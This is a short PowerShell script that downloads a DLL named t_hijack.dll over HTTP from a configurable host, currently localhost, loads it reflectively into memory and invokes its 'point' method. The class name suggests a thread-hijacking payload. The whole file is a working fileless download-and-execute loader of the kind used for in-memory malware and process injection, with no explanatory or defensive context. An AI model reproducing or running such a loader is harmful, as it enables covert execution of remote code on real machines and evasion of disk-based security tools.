$HOST = 'localhost'
$data = (new-object system.net.webclient).downloaddata('http://$HOST/t_hijack.dll')
$assembly = [System.Reflection.Assembly]::Load($data)
$class = $assembly.GetType('thread_hijacking.t_hijack')
$method = $class.GetMethod('point')
$method.Invoke(0, $null)
